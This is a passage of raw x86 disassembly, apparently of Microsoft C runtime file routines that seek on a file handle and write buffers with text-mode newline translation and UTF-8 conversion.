  4031ed:	3b c7                	cmp    %edi,%eax
  4031ef:	75 13                	jne    0x403204
  4031f1:	ff 15 8c a0 40 00    	call   *0x40a08c
  4031f7:	85 c0                	test   %eax,%eax
  4031f9:	74 09                	je     0x403204
  4031fb:	50                   	push   %eax
  4031fc:	e8 a4 e7 ff ff       	call   0x4019a5
  403201:	59                   	pop    %ecx
  403202:	eb cf                	jmp    0x4031d3
  403204:	8b c6                	mov    %esi,%eax
  403206:	c1 f8 05             	sar    $0x5,%eax
  403209:	8b 04 85 c0 f9 40 00 	mov    0x40f9c0(,%eax,4),%eax
  403210:	83 e6 1f             	and    $0x1f,%esi
  403213:	c1 e6 06             	shl    $0x6,%esi
  403216:	8d 44 30 04          	lea    0x4(%eax,%esi,1),%eax
  40321a:	80 20 fd             	andb   $0xfd,(%eax)
  40321d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403220:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403223:	5f                   	pop    %edi
  403224:	5e                   	pop    %esi
  403225:	c9                   	leave
  403226:	c3                   	ret
  403227:	6a 14                	push   $0x14
  403229:	68 28 b6 40 00       	push   $0x40b628
  40322e:	e8 ed fc ff ff       	call   0x402f20
  403233:	83 ce ff             	or     $0xffffffff,%esi
  403236:	89 75 dc             	mov    %esi,-0x24(%ebp)
  403239:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40323c:	8b 45 08             	mov    0x8(%ebp),%eax
  40323f:	83 f8 fe             	cmp    $0xfffffffe,%eax
  403242:	75 1c                	jne    0x403260
  403244:	e8 49 e7 ff ff       	call   0x401992
  403249:	83 20 00             	andl   $0x0,(%eax)
  40324c:	e8 2e e7 ff ff       	call   0x40197f
  403251:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  403257:	8b c6                	mov    %esi,%eax
  403259:	8b d6                	mov    %esi,%edx
  40325b:	e9 d0 00 00 00       	jmp    0x403330
  403260:	33 ff                	xor    %edi,%edi
  403262:	3b c7                	cmp    %edi,%eax
  403264:	7c 08                	jl     0x40326e
  403266:	3b 05 ac f9 40 00    	cmp    0x40f9ac,%eax
  40326c:	72 21                	jb     0x40328f
  40326e:	e8 1f e7 ff ff       	call   0x401992
  403273:	89 38                	mov    %edi,(%eax)
  403275:	e8 05 e7 ff ff       	call   0x40197f
  40327a:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  403280:	57                   	push   %edi
  403281:	57                   	push   %edi
  403282:	57                   	push   %edi
  403283:	57                   	push   %edi
  403284:	57                   	push   %edi
  403285:	e8 8d e6 ff ff       	call   0x401917
  40328a:	83 c4 14             	add    $0x14,%esp
  40328d:	eb c8                	jmp    0x403257
  40328f:	8b c8                	mov    %eax,%ecx
  403291:	c1 f9 05             	sar    $0x5,%ecx
  403294:	8d 1c 8d c0 f9 40 00 	lea    0x40f9c0(,%ecx,4),%ebx
  40329b:	8b f0                	mov    %eax,%esi
  40329d:	83 e6 1f             	and    $0x1f,%esi
  4032a0:	c1 e6 06             	shl    $0x6,%esi
  4032a3:	8b 0b                	mov    (%ebx),%ecx
  4032a5:	0f be 4c 31 04       	movsbl 0x4(%ecx,%esi,1),%ecx
  4032aa:	83 e1 01             	and    $0x1,%ecx
  4032ad:	75 26                	jne    0x4032d5
  4032af:	e8 de e6 ff ff       	call   0x401992
  4032b4:	89 38                	mov    %edi,(%eax)
  4032b6:	e8 c4 e6 ff ff       	call   0x40197f
  4032bb:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4032c1:	57                   	push   %edi
  4032c2:	57                   	push   %edi
  4032c3:	57                   	push   %edi
  4032c4:	57                   	push   %edi
  4032c5:	57                   	push   %edi
  4032c6:	e8 4c e6 ff ff       	call   0x401917
  4032cb:	83 c4 14             	add    $0x14,%esp
  4032ce:	83 ca ff             	or     $0xffffffff,%edx
  4032d1:	8b c2                	mov    %edx,%eax
  4032d3:	eb 5b                	jmp    0x403330
  4032d5:	50                   	push   %eax
  4032d6:	e8 51 42 00 00       	call   0x40752c
  4032db:	59                   	pop    %ecx
  4032dc:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4032df:	8b 03                	mov    (%ebx),%eax
  4032e1:	f6 44 30 04 01       	testb  $0x1,0x4(%eax,%esi,1)
  4032e6:	74 1c                	je     0x403304
  4032e8:	ff 75 14             	push   0x14(%ebp)
  4032eb:	ff 75 10             	push   0x10(%ebp)
  4032ee:	ff 75 0c             	push   0xc(%ebp)
  4032f1:	ff 75 08             	push   0x8(%ebp)
  4032f4:	e8 a9 fe ff ff       	call   0x4031a2
  4032f9:	83 c4 10             	add    $0x10,%esp
  4032fc:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4032ff:	89 55 e0             	mov    %edx,-0x20(%ebp)
  403302:	eb 1a                	jmp    0x40331e
  403304:	e8 76 e6 ff ff       	call   0x40197f
  403309:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40330f:	e8 7e e6 ff ff       	call   0x401992
  403314:	89 38                	mov    %edi,(%eax)
  403316:	83 4d dc ff          	orl    $0xffffffff,-0x24(%ebp)
  40331a:	83 4d e0 ff          	orl    $0xffffffff,-0x20(%ebp)
  40331e:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403325:	e8 0c 00 00 00       	call   0x403336
  40332a:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40332d:	8b 55 e0             	mov    -0x20(%ebp),%edx
  403330:	e8 30 fc ff ff       	call   0x402f65
  403335:	c3                   	ret
  403336:	ff 75 08             	push   0x8(%ebp)
  403339:	e8 8e 42 00 00       	call   0x4075cc
  40333e:	59                   	pop    %ecx
  40333f:	c3                   	ret
  403340:	8b ff                	mov    %edi,%edi
  403342:	55                   	push   %ebp
  403343:	8b ec                	mov    %esp,%ebp
  403345:	b8 e4 1a 00 00       	mov    $0x1ae4,%eax
  40334a:	e8 a1 44 00 00       	call   0x4077f0
  40334f:	a1 60 db 40 00       	mov    0x40db60,%eax
  403354:	33 c5                	xor    %ebp,%eax
  403356:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403359:	8b 45 0c             	mov    0xc(%ebp),%eax
  40335c:	56                   	push   %esi
  40335d:	33 f6                	xor    %esi,%esi
  40335f:	89 85 34 e5 ff ff    	mov    %eax,-0x1acc(%ebp)
  403365:	89 b5 38 e5 ff ff    	mov    %esi,-0x1ac8(%ebp)
  40336b:	89 b5 30 e5 ff ff    	mov    %esi,-0x1ad0(%ebp)
  403371:	39 75 10             	cmp    %esi,0x10(%ebp)
  403374:	75 07                	jne    0x40337d
  403376:	33 c0                	xor    %eax,%eax
  403378:	e9 e9 06 00 00       	jmp    0x403a66
  40337d:	3b c6                	cmp    %esi,%eax
  40337f:	75 27                	jne    0x4033a8
  403381:	e8 0c e6 ff ff       	call   0x401992
  403386:	89 30                	mov    %esi,(%eax)
  403388:	e8 f2 e5 ff ff       	call   0x40197f
  40338d:	56                   	push   %esi
  40338e:	56                   	push   %esi
  40338f:	56                   	push   %esi
  403390:	56                   	push   %esi
  403391:	56                   	push   %esi
  403392:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  403398:	e8 7a e5 ff ff       	call   0x401917
  40339d:	83 c4 14             	add    $0x14,%esp
  4033a0:	83 c8 ff             	or     $0xffffffff,%eax
  4033a3:	e9 be 06 00 00       	jmp    0x403a66
  4033a8:	53                   	push   %ebx
  4033a9:	57                   	push   %edi
  4033aa:	8b 7d 08             	mov    0x8(%ebp),%edi
  4033ad:	8b c7                	mov    %edi,%eax
  4033af:	c1 f8 05             	sar    $0x5,%eax
  4033b2:	8d 34 85 c0 f9 40 00 	lea    0x40f9c0(,%eax,4),%esi
  4033b9:	8b 06                	mov    (%esi),%eax
  4033bb:	83 e7 1f             	and    $0x1f,%edi
  4033be:	c1 e7 06             	shl    $0x6,%edi
  4033c1:	03 c7                	add    %edi,%eax
  4033c3:	8a 58 24             	mov    0x24(%eax),%bl
  4033c6:	02 db                	add    %bl,%bl
  4033c8:	d0 fb                	sar    $1,%bl
  4033ca:	89 b5 28 e5 ff ff    	mov    %esi,-0x1ad8(%ebp)
  4033d0:	88 9d 27 e5 ff ff    	mov    %bl,-0x1ad9(%ebp)
  4033d6:	80 fb 02             	cmp    $0x2,%bl
  4033d9:	74 05                	je     0x4033e0
  4033db:	80 fb 01             	cmp    $0x1,%bl
  4033de:	75 30                	jne    0x403410
  4033e0:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4033e3:	f7 d1                	not    %ecx
  4033e5:	f6 c1 01             	test   $0x1,%cl
  4033e8:	75 26                	jne    0x403410
  4033ea:	e8 a3 e5 ff ff       	call   0x401992
  4033ef:	33 f6                	xor    %esi,%esi
  4033f1:	89 30                	mov    %esi,(%eax)
  4033f3:	e8 87 e5 ff ff       	call   0x40197f
  4033f8:	56                   	push   %esi
  4033f9:	56                   	push   %esi
  4033fa:	56                   	push   %esi
  4033fb:	56                   	push   %esi
  4033fc:	56                   	push   %esi
  4033fd:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  403403:	e8 0f e5 ff ff       	call   0x401917
  403408:	83 c4 14             	add    $0x14,%esp
  40340b:	e9 43 06 00 00       	jmp    0x403a53
  403410:	f6 40 04 20          	testb  $0x20,0x4(%eax)
  403414:	74 11                	je     0x403427
  403416:	6a 02                	push   $0x2
  403418:	6a 00                	push   $0x0
  40341a:	6a 00                	push   $0x0
  40341c:	ff 75 08             	push   0x8(%ebp)
  40341f:	e8 7e fd ff ff       	call   0x4031a2
  403424:	83 c4 10             	add    $0x10,%esp
  403427:	ff 75 08             	push   0x8(%ebp)
  40342a:	e8 69 07 00 00       	call   0x403b98
  40342f:	59                   	pop    %ecx
  403430:	85 c0                	test   %eax,%eax
  403432:	0f 84 9d 02 00 00    	je     0x4036d5
  403438:	8b 06                	mov    (%esi),%eax
  40343a:	f6 44 07 04 80       	testb  $0x80,0x4(%edi,%eax,1)
  40343f:	0f 84 90 02 00 00    	je     0x4036d5
  403445:	e8 cf f7 ff ff       	call   0x402c19
  40344a:	8b 40 6c             	mov    0x6c(%eax),%eax
  40344d:	33 c9                	xor    %ecx,%ecx
  40344f:	39 48 14             	cmp    %ecx,0x14(%eax)
  403452:	8d 85 1c e5 ff ff    	lea    -0x1ae4(%ebp),%eax
  403458:	0f 94 c1             	sete   %cl
  40345b:	50                   	push   %eax
  40345c:	8b 06                	mov    (%esi),%eax
  40345e:	ff 34 07             	push   (%edi,%eax,1)
  403461:	89 8d 20 e5 ff ff    	mov    %ecx,-0x1ae0(%ebp)
  403467:	ff 15 e0 a0 40 00    	call   *0x40a0e0
  40346d:	85 c0                	test   %eax,%eax
  40346f:	0f 84 60 02 00 00    	je     0x4036d5
  403475:	33 c9                	xor    %ecx,%ecx
  403477:	39 8d 20 e5 ff ff    	cmp    %ecx,-0x1ae0(%ebp)
  40347d:	74 08                	je     0x403487
  40347f:	84 db                	test   %bl,%bl
  403481:	0f 84 50 02 00 00    	je     0x4036d7
  403487:	ff 15 dc a0 40 00    	call   *0x40a0dc
  40348d:	8b 9d 34 e5 ff ff    	mov    -0x1acc(%ebp),%ebx
  403493:	89 85 1c e5 ff ff    	mov    %eax,-0x1ae4(%ebp)
  403499:	33 c0                	xor    %eax,%eax
  40349b:	89 85 3c e5 ff ff    	mov    %eax,-0x1ac4(%ebp)
  4034a1:	39 45 10             	cmp    %eax,0x10(%ebp)
  4034a4:	0f 86 42 05 00 00    	jbe    0x4039ec
  4034aa:	89 85 44 e5 ff ff    	mov    %eax,-0x1abc(%ebp)
  4034b0:	8a 85 27 e5 ff ff    	mov    -0x1ad9(%ebp),%al
  4034b6:	84 c0                	test   %al,%al
  4034b8:	0f 85 67 01 00 00    	jne    0x403625
  4034be:	8a 0b                	mov    (%ebx),%cl
  4034c0:	8b b5 28 e5 ff ff    	mov    -0x1ad8(%ebp),%esi
  4034c6:	33 c0                	xor    %eax,%eax
  4034c8:	80 f9 0a             	cmp    $0xa,%cl
  4034cb:	0f 94 c0             	sete   %al
  4034ce:	89 85 20 e5 ff ff    	mov    %eax,-0x1ae0(%ebp)
  4034d4:	8b 06                	mov    (%esi),%eax
  4034d6:	03 c7                	add    %edi,%eax
  4034d8:	83 78 38 00          	cmpl   $0x0,0x38(%eax)
  4034dc:	74 15                	je     0x4034f3
  4034de:	8a 50 34             	mov    0x34(%eax),%dl
  4034e1:	88 55 f4             	mov    %dl,-0xc(%ebp)
  4034e4:	88 4d f5             	mov    %cl,-0xb(%ebp)
  4034e7:	83 60 38 00          	andl   $0x0,0x38(%eax)
  4034eb:	6a 02                	push   $0x2
  4034ed:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4034f0:	50                   	push   %eax
  4034f1:	eb 4b                	jmp    0x40353e
  4034f3:	0f be c1             	movsbl %cl,%eax
  4034f6:	50                   	push   %eax
  4034f7:	e8 e0 16 00 00       	call   0x404bdc
  4034fc:	59                   	pop    %ecx
  4034fd:	85 c0                	test   %eax,%eax
  4034ff:	74 3a                	je     0x40353b
  403501:	8b 8d 34 e5 ff ff    	mov    -0x1acc(%ebp),%ecx
  403507:	2b cb                	sub    %ebx,%ecx
  403509:	03 4d 10             	add    0x10(%ebp),%ecx
  40350c:	33 c0                	xor    %eax,%eax
  40350e:	40                   	inc    %eax
  40350f:	3b c8                	cmp    %eax,%ecx
  403511:	0f 86 a5 01 00 00    	jbe    0x4036bc
  403517:	6a 02                	push   $0x2
  403519:	8d 85 40 e5 ff ff    	lea    -0x1ac0(%ebp),%eax
  40351f:	53                   	push   %ebx
  403520:	50                   	push   %eax
  403521:	e8 a9 42 00 00       	call   0x4077cf
  403526:	83 c4 0c             	add    $0xc,%esp
  403529:	83 f8 ff             	cmp    $0xffffffff,%eax
  40352c:	0f 84 b1 04 00 00    	je     0x4039e3
  403532:	43                   	inc    %ebx
  403533:	ff 85 44 e5 ff ff    	incl   -0x1abc(%ebp)
  403539:	eb 1b                	jmp    0x403556
  40353b:	6a 01                	push   $0x1
  40353d:	53                   	push   %ebx
  40353e:	8d 85 40 e5 ff ff    	lea    -0x1ac0(%ebp),%eax
  403544:	50                   	push   %eax
  403545:	e8 85 42 00 00       	call   0x4077cf
  40354a:	83 c4 0c             	add    $0xc,%esp
  40354d:	83 f8 ff             	cmp    $0xffffffff,%eax
  403550:	0f 84 8d 04 00 00    	je     0x4039e3
  403556:	33 c0                	xor    %eax,%eax
  403558:	50                   	push   %eax
  403559:	50                   	push   %eax
  40355a:	6a 05                	push   $0x5
  40355c:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40355f:	51                   	push   %ecx
  403560:	6a 01                	push   $0x1
  403562:	8d 8d 40 e5 ff ff    	lea    -0x1ac0(%ebp),%ecx
  403568:	51                   	push   %ecx
  403569:	50                   	push   %eax
  40356a:	ff b5 1c e5 ff ff    	push   -0x1ae4(%ebp)
  403570:	43                   	inc    %ebx
  403571:	ff 85 44 e5 ff ff    	incl   -0x1abc(%ebp)
  403577:	ff 15 88 a0 40 00    	call   *0x40a088
  40357d:	8b f0                	mov    %eax,%esi
  40357f:	85 f6                	test   %esi,%esi
  403581:	0f 84 5c 04 00 00    	je     0x4039e3
  403587:	6a 00                	push   $0x0
  403589:	8d 85 3c e5 ff ff    	lea    -0x1ac4(%ebp),%eax
  40358f:	50                   	push   %eax
  403590:	56                   	push   %esi
  403591:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403594:	50                   	push   %eax
  403595:	8b 85 28 e5 ff ff    	mov    -0x1ad8(%ebp),%eax
  40359b:	8b 00                	mov    (%eax),%eax
  40359d:	ff 34 07             	push   (%edi,%eax,1)
  4035a0:	ff 15 2c a0 40 00    	call   *0x40a02c
  4035a6:	85 c0                	test   %eax,%eax
  4035a8:	0f 84 29 04 00 00    	je     0x4039d7
  4035ae:	8b 85 44 e5 ff ff    	mov    -0x1abc(%ebp),%eax
  4035b4:	8b 8d 30 e5 ff ff    	mov    -0x1ad0(%ebp),%ecx
  4035ba:	03 c1                	add    %ecx,%eax
  4035bc:	39 b5 3c e5 ff ff    	cmp    %esi,-0x1ac4(%ebp)
  4035c2:	89 85 38 e5 ff ff    	mov    %eax,-0x1ac8(%ebp)
  4035c8:	0f 8c 15 04 00 00    	jl     0x4039e3
  4035ce:	83 bd 20 e5 ff ff 00 	cmpl   $0x0,-0x1ae0(%ebp)
  4035d5:	0f 84 cd 00 00 00    	je     0x4036a8
  4035db:	6a 00                	push   $0x0
  4035dd:	8d 85 3c e5 ff ff    	lea    -0x1ac4(%ebp),%eax
  4035e3:	50                   	push   %eax
  4035e4:	6a 01                	push   $0x1
  4035e6:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4035e9:	50                   	push   %eax
  4035ea:	8b 85 28 e5 ff ff    	mov    -0x1ad8(%ebp),%eax
  4035f0:	8b 00                	mov    (%eax),%eax
  4035f2:	c6 45 f4 0d          	movb   $0xd,-0xc(%ebp)
  4035f6:	ff 34 07             	push   (%edi,%eax,1)
  4035f9:	ff 15 2c a0 40 00    	call   *0x40a02c
  4035ff:	85 c0                	test   %eax,%eax
  403601:	0f 84 d0 03 00 00    	je     0x4039d7
  403607:	83 bd 3c e5 ff ff 01 	cmpl   $0x1,-0x1ac4(%ebp)
  40360e:	0f 8c cf 03 00 00    	jl     0x4039e3
  403614:	ff 85 30 e5 ff ff    	incl   -0x1ad0(%ebp)
  40361a:	ff 85 38 e5 ff ff    	incl   -0x1ac8(%ebp)
  403620:	e9 83 00 00 00       	jmp    0x4036a8
  403625:	3c 01                	cmp    $0x1,%al
  403627:	74 04                	je     0x40362d
  403629:	3c 02                	cmp    $0x2,%al
  40362b:	75 21                	jne    0x40364e
  40362d:	0f b7 33             	movzwl (%ebx),%esi
  403630:	33 c9                	xor    %ecx,%ecx
  403632:	66 83 fe 0a          	cmp    $0xa,%si
  403636:	0f 94 c1             	sete   %cl
  403639:	43                   	inc    %ebx
  40363a:	43                   	inc    %ebx
  40363b:	83 85 44 e5 ff ff 02 	addl   $0x2,-0x1abc(%ebp)
  403642:	89 b5 40 e5 ff ff    	mov    %esi,-0x1ac0(%ebp)
  403648:	89 8d 20 e5 ff ff    	mov    %ecx,-0x1ae0(%ebp)
  40364e:	3c 01                	cmp    $0x1,%al
  403650:	74 04                	je     0x403656
  403652:	3c 02                	cmp    $0x2,%al
  403654:	75 52                	jne    0x4036a8
  403656:	ff b5 40 e5 ff ff    	push   -0x1ac0(%ebp)
  40365c:	e8 92 3f 00 00       	call   0x4075f3
  403661:	59                   	pop    %ecx
  403662:	66 3b 85 40 e5 ff ff 	cmp    -0x1ac0(%ebp),%ax
  403669:	0f 85 68 03 00 00    	jne    0x4039d7
  40366f:	83 85 38 e5 ff ff 02 	addl   $0x2,-0x1ac8(%ebp)
  403676:	83 bd 20 e5 ff ff 00 	cmpl   $0x0,-0x1ae0(%ebp)
  40367d:	74 29                	je     0x4036a8
  40367f:	6a 0d                	push   $0xd
  403681:	58                   	pop    %eax
  403682:	50                   	push   %eax
  403683:	89 85 40 e5 ff ff    	mov    %eax,-0x1ac0(%ebp)
  403689:	e8 65 3f 00 00       	call   0x4075f3
  40368e:	59                   	pop    %ecx
  40368f:	66 3b 85 40 e5 ff ff 	cmp    -0x1ac0(%ebp),%ax
  403696:	0f 85 3b 03 00 00    	jne    0x4039d7
  40369c:	ff 85 38 e5 ff ff    	incl   -0x1ac8(%ebp)
  4036a2:	ff 85 30 e5 ff ff    	incl   -0x1ad0(%ebp)
  4036a8:	8b 45 10             	mov    0x10(%ebp),%eax
  4036ab:	39 85 44 e5 ff ff    	cmp    %eax,-0x1abc(%ebp)
  4036b1:	0f 82 f9 fd ff ff    	jb     0x4034b0
  4036b7:	e9 27 03 00 00       	jmp    0x4039e3
  4036bc:	8b 0e                	mov    (%esi),%ecx
  4036be:	8a 13                	mov    (%ebx),%dl
  4036c0:	ff 85 38 e5 ff ff    	incl   -0x1ac8(%ebp)
  4036c6:	88 54 0f 34          	mov    %dl,0x34(%edi,%ecx,1)
  4036ca:	8b 0e                	mov    (%esi),%ecx
  4036cc:	89 44 0f 38          	mov    %eax,0x38(%edi,%ecx,1)
  4036d0:	e9 0e 03 00 00       	jmp    0x4039e3
  4036d5:	33 c9                	xor    %ecx,%ecx
  4036d7:	8b 06                	mov    (%esi),%eax
  4036d9:	03 c7                	add    %edi,%eax
  4036db:	f6 40 04 80          	testb  $0x80,0x4(%eax)
  4036df:	0f 84 bf 02 00 00    	je     0x4039a4
  4036e5:	8b 85 34 e5 ff ff    	mov    -0x1acc(%ebp),%eax
  4036eb:	89 8d 40 e5 ff ff    	mov    %ecx,-0x1ac0(%ebp)
  4036f1:	84 db                	test   %bl,%bl
  4036f3:	0f 85 ca 00 00 00    	jne    0x4037c3
  4036f9:	89 85 3c e5 ff ff    	mov    %eax,-0x1ac4(%ebp)
  4036ff:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  403702:	0f 86 20 03 00 00    	jbe    0x403a28
  403708:	eb 06                	jmp    0x403710
  40370a:	8b b5 28 e5 ff ff    	mov    -0x1ad8(%ebp),%esi
  403710:	8b 8d 3c e5 ff ff    	mov    -0x1ac4(%ebp),%ecx
  403716:	83 a5 44 e5 ff ff 00 	andl   $0x0,-0x1abc(%ebp)
  40371d:	2b 8d 34 e5 ff ff    	sub    -0x1acc(%ebp),%ecx
  403723:	8d 85 48 e5 ff ff    	lea    -0x1ab8(%ebp),%eax
  403729:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  40372c:	73 39                	jae    0x403767
  40372e:	8b 95 3c e5 ff ff    	mov    -0x1ac4(%ebp),%edx
  403734:	ff 85 3c e5 ff ff    	incl   -0x1ac4(%ebp)
  40373a:	8a 12                	mov    (%edx),%dl
  40373c:	41                   	inc    %ecx
  40373d:	80 fa 0a             	cmp    $0xa,%dl
  403740:	75 10                	jne    0x403752
  403742:	ff 85 30 e5 ff ff    	incl   -0x1ad0(%ebp)
  403748:	c6 00 0d             	movb   $0xd,(%eax)
  40374b:	40                   	inc    %eax
  40374c:	ff 85 44 e5 ff ff    	incl   -0x1abc(%ebp)
  403752:	88 10                	mov    %dl,(%eax)
  403754:	40                   	inc    %eax
  403755:	ff 85 44 e5 ff ff    	incl   -0x1abc(%ebp)
  40375b:	81 bd 44 e5 ff ff ff 	cmpl   $0x13ff,-0x1abc(%ebp)
  403762:	13 00 00 
  403765:	72 c2                	jb     0x403729
  403767:	8b d8                	mov    %eax,%ebx
  403769:	8d 85 48 e5 ff ff    	lea    -0x1ab8(%ebp),%eax
  40376f:	2b d8                	sub    %eax,%ebx
  403771:	6a 00                	push   $0x0
  403773:	8d 85 2c e5 ff ff    	lea    -0x1ad4(%ebp),%eax
  403779:	50                   	push   %eax
  40377a:	53                   	push   %ebx
  40377b:	8d 85 48 e5 ff ff    	lea    -0x1ab8(%ebp),%eax
  403781:	50                   	push   %eax
  403782:	8b 06                	mov    (%esi),%eax
  403784:	ff 34 07             	push   (%edi,%eax,1)
  403787:	ff 15 2c a0 40 00    	call   *0x40a02c
  40378d:	85 c0                	test   %eax,%eax
  40378f:	0f 84 42 02 00 00    	je     0x4039d7
  403795:	8b 85 2c e5 ff ff    	mov    -0x1ad4(%ebp),%eax
  40379b:	01 85 38 e5 ff ff    	add    %eax,-0x1ac8(%ebp)
  4037a1:	3b c3                	cmp    %ebx,%eax
  4037a3:	0f 8c 3a 02 00 00    	jl     0x4039e3
  4037a9:	8b 85 3c e5 ff ff    	mov    -0x1ac4(%ebp),%eax
  4037af:	2b 85 34 e5 ff ff    	sub    -0x1acc(%ebp),%eax
  4037b5:	3b 45 10             	cmp    0x10(%ebp),%eax
  4037b8:	0f 82 4c ff ff ff    	jb     0x40370a
  4037be:	e9 20 02 00 00       	jmp    0x4039e3
  4037c3:	89 85 44 e5 ff ff    	mov    %eax,-0x1abc(%ebp)
  4037c9:	80 fb 02             	cmp    $0x2,%bl
  4037cc:	0f 85 d1 00 00 00    	jne    0x4038a3
  4037d2:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  4037d5:	0f 86 4d 02 00 00    	jbe    0x403a28
  4037db:	eb 06                	jmp    0x4037e3
  4037dd:	8b b5 28 e5 ff ff    	mov    -0x1ad8(%ebp),%esi
  4037e3:	8b 8d 44 e5 ff ff    	mov    -0x1abc(%ebp),%ecx
  4037e9:	83 a5 3c e5 ff ff 00 	andl   $0x0,-0x1ac4(%ebp)
  4037f0:	2b 8d 34 e5 ff ff    	sub    -0x1acc(%ebp),%ecx
  4037f6:	8d 85 48 e5 ff ff    	lea    -0x1ab8(%ebp),%eax
  4037fc:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  4037ff:	73 46                	jae    0x403847
  403801:	8b 95 44 e5 ff ff    	mov    -0x1abc(%ebp),%edx
  403807:	83 85 44 e5 ff ff 02 	addl   $0x2,-0x1abc(%ebp)
  40380e:	0f b7 12             	movzwl (%edx),%edx
  403811:	41                   	inc    %ecx
  403812:	41                   	inc    %ecx
  403813:	66 83 fa 0a          	cmp    $0xa,%dx
  403817:	75 16                	jne    0x40382f
  403819:	83 85 30 e5 ff ff 02 	addl   $0x2,-0x1ad0(%ebp)
  403820:	6a 0d                	push   $0xd
  403822:	5b                   	pop    %ebx
  403823:	66 89 18             	mov    %bx,(%eax)
  403826:	40                   	inc    %eax
  403827:	40                   	inc    %eax
  403828:	83 85 3c e5 ff ff 02 	addl   $0x2,-0x1ac4(%ebp)
  40382f:	83 85 3c e5 ff ff 02 	addl   $0x2,-0x1ac4(%ebp)
  403836:	66 89 10             	mov    %dx,(%eax)
  403839:	40                   	inc    %eax
  40383a:	40                   	inc    %eax
  40383b:	81 bd 3c e5 ff ff fe 	cmpl   $0x13fe,-0x1ac4(%ebp)
  403842:	13 00 00 
  403845:	72 b5                	jb     0x4037fc
  403847:	8b d8                	mov    %eax,%ebx
  403849:	8d 85 48 e5 ff ff    	lea    -0x1ab8(%ebp),%eax
  40384f:	2b d8                	sub    %eax,%ebx
  403851:	6a 00                	push   $0x0
  403853:	8d 85 2c e5 ff ff    	lea    -0x1ad4(%ebp),%eax
  403859:	50                   	push   %eax
  40385a:	53                   	push   %ebx
  40385b:	8d 85 48 e5 ff ff    	lea    -0x1ab8(%ebp),%eax
  403861:	50                   	push   %eax
  403862:	8b 06                	mov    (%esi),%eax
  403864:	ff 34 07             	push   (%edi,%eax,1)
  403867:	ff 15 2c a0 40 00    	call   *0x40a02c
  40386d:	85 c0                	test   %eax,%eax
  40386f:	0f 84 62 01 00 00    	je     0x4039d7
  403875:	8b 85 2c e5 ff ff    	mov    -0x1ad4(%ebp),%eax
  40387b:	01 85 38 e5 ff ff    	add    %eax,-0x1ac8(%ebp)
  403881:	3b c3                	cmp    %ebx,%eax
  403883:	0f 8c 5a 01 00 00    	jl     0x4039e3
  403889:	8b 85 44 e5 ff ff    	mov    -0x1abc(%ebp),%eax
  40388f:	2b 85 34 e5 ff ff    	sub    -0x1acc(%ebp),%eax
  403895:	3b 45 10             	cmp    0x10(%ebp),%eax
  403898:	0f 82 3f ff ff ff    	jb     0x4037dd
  40389e:	e9 40 01 00 00       	jmp    0x4039e3
  4038a3:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  4038a6:	0f 86 7c 01 00 00    	jbe    0x403a28
  4038ac:	8b 8d 44 e5 ff ff    	mov    -0x1abc(%ebp),%ecx
  4038b2:	83 a5 3c e5 ff ff 00 	andl   $0x0,-0x1ac4(%ebp)
  4038b9:	2b 8d 34 e5 ff ff    	sub    -0x1acc(%ebp),%ecx
  4038bf:	6a 02                	push   $0x2
  4038c1:	8d 85 48 f9 ff ff    	lea    -0x6b8(%ebp),%eax
  4038c7:	5e                   	pop    %esi
  4038c8:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  4038cb:	73 3c                	jae    0x403909
  4038cd:	8b 95 44 e5 ff ff    	mov    -0x1abc(%ebp),%edx
  4038d3:	0f b7 12             	movzwl (%edx),%edx
  4038d6:	01 b5 44 e5 ff ff    	add    %esi,-0x1abc(%ebp)
  4038dc:	03 ce                	add    %esi,%ecx
  4038de:	66 83 fa 0a          	cmp    $0xa,%dx
  4038e2:	75 0e                	jne    0x4038f2
  4038e4:	6a 0d                	push   $0xd
  4038e6:	5b                   	pop    %ebx
  4038e7:	66 89 18             	mov    %bx,(%eax)
  4038ea:	03 c6                	add    %esi,%eax
  4038ec:	01 b5 3c e5 ff ff    	add    %esi,-0x1ac4(%ebp)
  4038f2:	01 b5 3c e5 ff ff    	add    %esi,-0x1ac4(%ebp)
  4038f8:	66 89 10             	mov    %dx,(%eax)
  4038fb:	03 c6                	add    %esi,%eax
  4038fd:	81 bd 3c e5 ff ff a8 	cmpl   $0x6a8,-0x1ac4(%ebp)
  403904:	06 00 00 
  403907:	72 bf                	jb     0x4038c8
  403909:	33 f6                	xor    %esi,%esi
  40390b:	56                   	push   %esi
  40390c:	56                   	push   %esi
  40390d:	68 55 0d 00 00       	push   $0xd55
  403912:	8d 8d f0 eb ff ff    	lea    -0x1410(%ebp),%ecx
  403918:	51                   	push   %ecx
  403919:	8d 8d 48 f9 ff ff    	lea    -0x6b8(%ebp),%ecx
  40391f:	2b c1                	sub    %ecx,%eax
  403921:	99                   	cltd
  403922:	2b c2                	sub    %edx,%eax
  403924:	d1 f8                	sar    $1,%eax
  403926:	50                   	push   %eax
  403927:	8b c1                	mov    %ecx,%eax
  403929:	50                   	push   %eax
  40392a:	56                   	push   %esi
  40392b:	68 e9 fd 00 00       	push   $0xfde9
  403930:	ff 15 88 a0 40 00    	call   *0x40a088
  403936:	8b d8                	mov    %eax,%ebx
  403938:	3b de                	cmp    %esi,%ebx
  40393a:	0f 84 97 00 00 00    	je     0x4039d7
  403940:	6a 00                	push   $0x0
